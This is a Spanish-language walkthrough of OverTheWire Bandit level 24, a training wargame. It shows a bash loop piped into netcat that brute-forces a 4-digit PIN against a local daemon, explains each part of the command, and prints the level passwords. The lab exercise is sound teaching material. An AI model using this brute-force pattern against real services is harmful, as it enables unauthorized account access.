# Retos bandit

# Level 24

## Objetivo

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time.

## Datos de acceso al nivel
Contraseña del nivel: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Solución

Contraseña **bandit25**:  iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```
bandit24@bandit:~$ for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002 | grep -v "error"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.

Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

bandit24@bandit:~$

```

## Notas

Descripción de:  **for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002 | grep -v "error"**

### 1. **`for i in {0000..9999};`**

Este es un bucle `for` que itera sobre un rango de números, desde `0000` hasta `9999`. En cada iteración, la variable `i` toma un valor en ese rango (es decir, desde 0000 hasta 9999, en formato de cuatro dígitos).

### 2. **`do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done`**

Para cada iteración del bucle, este comando ejecuta el `echo` que imprime la cadena `"gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"` seguida por el valor actual de la variable `i`. Básicamente, está generando una serie de cadenas en las que el número varía desde `0000` hasta `9999`.

### 3. **`| nc localhost 30002`**

El símbolo `|` (pipe) redirige la salida del comando anterior (es decir, la serie de cadenas generadas) al siguiente comando, que es `nc`. El comando `nc` (Netcat) se utiliza para establecer una conexión de red, en este caso con el `localhost` (el propio ordenador) en el puerto `30002`. El resultado es que las cadenas generadas se envían al servicio o aplicación que está escuchando en este puerto.

### 4. **`| grep -v "error"`**

Finalmente, la salida de la conexión Netcat es pasada al comando `grep`. `grep` busca patrones en el texto, y con la opción `-v`, está buscando todas las líneas que **no** contienen la palabra `"error"`. Así que cualquier salida que contenga "error" es descartada y solo se muestran las líneas que no lo contienen.

## Referencias


